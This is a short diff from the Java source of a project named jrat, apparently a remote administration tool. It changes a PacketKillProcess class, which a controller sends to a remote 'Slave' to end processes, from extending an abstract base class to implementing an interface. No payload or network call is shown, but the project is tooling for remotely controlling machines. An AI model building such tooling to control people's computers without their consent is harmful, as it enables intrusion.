@@ -1,10 +1,10 @@
 package jrat.module.process;
 
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
+import jrat.controller.packets.outgoing.OutgoingPacket;
 
 
-public class PacketKillProcess extends AbstractOutgoingPacket {
+public class PacketKillProcess implements OutgoingPacket {
 
 	private String process;
 
